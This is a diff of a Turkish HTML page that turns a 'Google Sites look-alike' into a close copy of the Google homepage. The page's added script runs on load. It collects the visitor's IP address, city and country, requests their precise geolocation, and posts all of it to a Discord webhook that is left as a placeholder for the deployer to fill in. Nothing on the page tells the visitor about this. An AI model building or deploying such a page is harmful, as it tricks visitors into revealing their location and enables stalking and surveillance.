@@ -2,78 +2,78 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Google Sites Benzeri</title>
+    <title>Google</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #fff; /* Beyaz Arka Plan */
+            background-color: #fff;
             color: #202124;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
         }
 
-        /* Üst Bilgi Stilleri */
+        /* Üst Bilgi */
         .top-bar {
-            background-color: #fff;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
             padding: 15px 20px;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            border-bottom: 1px solid #dadce0;
+        }
+
+        .top-bar-right {
             display: flex;
             align-items: center;
+        }
+
+        .gmail-link, .images-link, .app-icon {
+            margin-right: 20px;
+            text-decoration: none;
+            color: #202124;
+        }
+
+        .account-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background-color: #ccc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 18px;
+            cursor: pointer;
+        }
+
+        /* Ana İçerik */
+        .content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 100px;
         }
 
         .google-logo {
-            width: 75px;
-            margin-right: 20px;
+            width: 272px;
+            margin-bottom: 20px;
         }
 
-        /* Uyarı Stilleri */
-        .alert-container {
-            position: fixed;
-            top: 10px;
-            right: 10px;
-            background-color: #ff9800; /* Turuncu */
-            color: white;
-            padding: 10px 20px;
-            border-radius: 5px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
-            z-index: 1000;
-            display: none; /* Başlangıçta gizli */
-        }
-        .alert-container.show {
-            display: block;
-        }
-
-        /* İçerik Stilleri */
-        .content {
-            padding: 20px;
-            flex-grow: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center; /* İçeriği dikey olarak ortala */
-            text-align: center;
-        }
-
-        /* Sahte Arama Çubuğu Stilleri */
         .search-bar-container {
             display: flex;
             align-items: center;
-            background-color: #fff;
             border: 1px solid #dfe1e5;
             border-radius: 24px;
             padding: 10px 20px;
+            width: 600px;
+            max-width: 80%;
             margin-bottom: 20px;
-            width: 80%;
-            max-width: 600px;
         }
+
         .search-icon, .mic-icon {
             margin-right: 10px;
             color: #9aa0a6;
         }
+
         .search-input {
             border: none;
             outline: none;
@@ -81,97 +81,167 @@
             width: 100%;
         }
 
-        /* Konum İsteği Stilleri */
-        .location-request-container {
-            text-align: center;
-            padding: 30px;
-            border: 1px solid #dfe1e5;
-            border-radius: 8px;
-            background-color: #f9f9f9;
-            width: 80%;
-            max-width: 600px;
+        .buttons {
+            margin-top: 20px;
         }
-        .location-request-button {
-            background-color: #4285f4;
-            color: white;
-            padding: 12px 25px;
-            border: none;
-            border-radius: 5px;
+
+        .search-button, .lucky-button {
+            background-color: #f8f9fa;
+            border: 1px solid #f8f9fa;
+            border-radius: 4px;
+            padding: 10px 16px;
+            font-size: 14px;
+            color: #5f6368;
             cursor: pointer;
-            font-size: 16px;
-            margin-top: 15px;
+            margin: 0 5px;
         }
-        .location-request-message {
-            margin-bottom: 20px;
+
+        /* Alt Bilgi */
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: #f2f2f2;
+            padding: 15px;
+            font-size: 14px;
+            color: #70757a;
+            border-top: 1px solid #dadce0;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .footer-link {
+            text-decoration: none;
+            color: #70757a;
+            margin: 0 10px;
+        }
+
+        /* Konum Bekleniyor Mesajı */
+        .location-message {
+            margin-top: 20px;
             font-size: 16px;
             color: #333;
+            display: none; /* Başlangıçta gizli */
+        }
+        .location-message.show {
+            display: block;
         }
     </style>
 </head>
 <body>
     <!-- Üst Bilgi -->
     <div class="top-bar">
-        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="google-logo">
+        <div class="top-bar-left">
+        </div>
+        <div class="top-bar-right">
+            <a href="#" class="gmail-link">Gmail</a>
+            <a href="#" class="images-link">Görseller</a>
+            <div class="app-icon">&#9776;</div>
+            <div class="account-icon">A</div>
+        </div>
     </div>
-    <!-- Uyarı Mesajı -->
-    <div class="alert-container" id="alertContainer">
-        Bu site +16 yaş içindir ve hile ile alakalıdır. Konumunuz alınmadan giriş yapılamaz.
-    </div>
-    <!-- Sahte İçerik -->
+
+    <!-- Ana İçerik -->
     <div class="content">
-        <!-- Sahte Arama Çubuğu -->
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="google-logo">
         <div class="search-bar-container">
             <span class="search-icon">&#128269;</span>
             <input type="text" class="search-input" placeholder="Google'da arayın veya bir URL yazın">
             <span class="mic-icon">&#127928;</span>
         </div>
-        <!-- Konum İsteği Alanı -->
-        <div class="location-request-container" id="locationRequestContainer">
-            <p class="location-request-message">Konumunuzun doğrulanması gerekiyor. Lütfen konum izni verin.</p>
-            <button class="location-request-button" onclick="requestLocationPermission()">Konum İznini Ver</button>
+        <div class="buttons">
+            <button class="search-button">Google'da Ara</button>
+            <button class="lucky-button">Kendimi Şanslı Hissediyorum</button>
+        </div>
+        <p class="location-message" id="locationMessage">Konum bekleniyor...</p>
+    </div>
+
+    <!-- Alt Bilgi -->
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#" class="footer-link">Reklam</a>
+            <a href="#" class="footer-link">İşletmeler</a>
+            <a href="#" class="footer-link">Hakkında</a>
+            <a href="#" class="footer-link">Gizlilik</a>
+            <a href="#" class="footer-link">Şartlar</a>
+            <a href="#" class="footer-link">Ayarlar</a>
         </div>
     </div>
+
     <script>
-        // Uyarı mesajını göster
-        document.getElementById('alertContainer').classList.add('show');
         // WEBHOOK URL'NİZİ BURAYA YAZIN (Discord için)
         const webhookUrl = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"; // ÖRNEK
-        let permissionGranted = false; // İzin durumu
+        const locationMessage = document.getElementById('locationMessage');
 
-        function requestLocationPermission() {
-            if (permissionGranted) {
-                // Eğer izin zaten verilmişse, tekrar istemeye gerek yok
-                alert("Konum izni zaten verildi.");
-                return;
+        // IP Adresini Al ve Webhook'a Gönder
+        async function getAndSendIP() {
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                if (!ipResponse.ok) {
+                    throw new Error(`IP adresi alınamadı: ${ipResponse.status} ${ipResponse.statusText}`);
+                }
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
+                const city = ipData.city;
+                const country = ipData.country_name;
+
+                // IP bilgisini Discord'a gönder
+                await sendToDiscord({
+                    content: `🌐 **IP Bilgisi:**`,
+                    embeds: [{
+                        title: "IP Bilgileri",
+                        color: 5814783,
+                        fields: [
+                            { name: "IP Adresi", value: `\`${ipAddress}\``, inline: true },
+                            { name: "Şehir", value: `\`${city}\``, inline: true },
+                            { name: "Ülke", value: `\`${country}\``, inline: true }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                });
+            } catch (error) {
+                console.error("IP adresi alınırken veya gönderilirken hata:", error);
+                await sendToDiscord({ content: `⚠️ **IP Hatası:** IP adresi alınamadı veya gönderilemedi.` });
             }
+        }
+
+        // Konum İzni İsteme ve Webhook'a Gönderme
+        function requestLocationPermission() {
             if ("geolocation" in navigator) {
+                locationMessage.classList.add('show'); // "Konum bekleniyor..." mesajını göster
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
+                    async (position) => {
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
                         const accuracy = position.coords.accuracy;
                         const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                        permissionGranted = true; // İzin verildi
-                        // Konum bilgisi alındıktan sonra yapılacak işlemler
-                        sendLocationLog(latitude, longitude, accuracy, mapsUrl)
-                            .then(() => {
-                                alert("Konum bilgisi başarıyla gönderildi!");
-                                document.getElementById('locationRequestContainer').style.display = 'none'; // Konum alındıktan sonra alanı gizle
-                            })
-                            .catch((error) => {
-                                console.error("Konum bilgisi gönderilirken hata:", error);
-                                alert("Konum bilgisi gönderilirken bir hata oluştu. Lütfen konsolu kontrol edin.");
-                            });
+
+                        // Konum bilgisini Discord'a gönder
+                        await sendToDiscord({
+                            content: `📍 **Konum Bilgisi:**`,
+                            embeds: [{
+                                title: "Konum Bilgisi",
+                                color: 5814783,
+                                fields: [
+                                    { name: "Enlem (Latitude)", value: `\`${latitude}\``, inline: true },
+                                    { name: "Boylam (Longitude)", value: `\`${longitude}\``, inline: true },
+                                    { name: "Doğruluk", value: `\`~${accuracy.toFixed(0)} metre\``, inline: true },
+                                    { name: "Harita Linki", value: `[Google Maps](${mapsUrl})`, inline: false }
+                                ],
+                                timestamp: new Date().toISOString()
+                            }]
+                        });
+                        locationMessage.classList.remove('show'); // Mesajı gizle
                     },
                     (error) => {
                         let errorMessage = "Konum alınamadı.";
                         switch (error.code) {
                             case error.PERMISSION_DENIED:
                                 errorMessage = "Konum izni reddedildi.";
-                                // İzin reddedilirse tekrar isteme (ısrar etme)
-                                setTimeout(() => {
-                                    requestLocationPermission(); // 3 saniye sonra tekrar iste
-                                }, 3000);
                                 break;
                             case error.POSITION_UNAVAILABLE:
                                 errorMessage = "Konum bilgisi mevcut değil.";
@@ -181,27 +251,17 @@
                                 break;
                         }
                         alert(errorMessage);
+                        locationMessage.classList.remove('show'); // Mesajı gizle
                     }
                 );
             } else {
                 alert("Tarayıcınız konum özelliğini desteklemiyor.");
+                locationMessage.classList.remove('show'); // Mesajı gizle
             }
         }
-        async function sendLocationLog(lat, lon, acc, mapUrl) {
-            const payload = {
-                content: "📍 **Konum Bilgisi!**",
-                embeds: [{
-                    title: "Konum Bilgisi",
-                    color: 5814783,
-                    fields: [
-                        { name: "Enlem (Latitude)", value: `\`\`\`${lat}\`\`\``, inline: true },
-                        { name: "Boylam (Longitude)", value: `\`\`\`${lon}\`\`\``, inline: true },
-                        { name: "Doğruluk", value: `\`\`\`~${acc.toFixed(0)} metre\`\`\``, inline: true },
-                        { name: "Harita Linki", value: `[Google Maps](${mapUrl})`, inline: false },
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
-            };
+
+        // Discord'a Gönderme Fonksiyonu
+        async function sendToDiscord(payload) {
             try {
                 const response = await fetch(webhookUrl, {
                     method: 'POST',
@@ -214,9 +274,15 @@
                 console.log("Discord'a log başarıyla gönderildi.");
             } catch (discordError) {
                 console.error("Discord'a log gönderilirken hata:", discordError);
-                throw discordError;
+                // Hata durumunda uyarı vermek veya log tutmak için bir işlem yapabilirsiniz.
             }
         }
+
+        // Sayfa yüklendiğinde IP'yi al ve konum iznini iste
+        window.onload = async () => {
+            await getAndSendIP(); // Sayfa yüklendiğinde IP'yi al
+            requestLocationPermission(); // Konum iznini iste
+        };
     </script>
 </body>
 </html>
